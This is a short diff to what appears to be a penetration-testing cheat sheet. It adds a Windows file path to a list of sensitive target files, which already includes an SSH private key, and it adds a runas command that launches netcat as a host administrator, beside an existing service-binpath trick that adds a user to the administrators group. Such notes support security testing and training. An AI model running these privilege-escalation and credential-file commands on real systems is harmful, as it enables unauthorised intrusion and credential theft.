@@ -277,6 +277,7 @@ https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt
 /etc/knockd.conf
 
 #Windows
+/Windows/system.ini
 /Windows/System32/Drivers/etc/hosts
 /Users/ana/.ssh/id_rsa
 ```
@@ -892,6 +893,9 @@ Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuou
 sc config WindscribeService binpath="cmd /c net localgroup administrators my /add"
 sc stop WindscribeService
 sc start WindscribeService
+
+# runas 
+runas /env /profile /user:DVR4\Administrator "nc.exe"
 ```
 ### token
 ```powershell
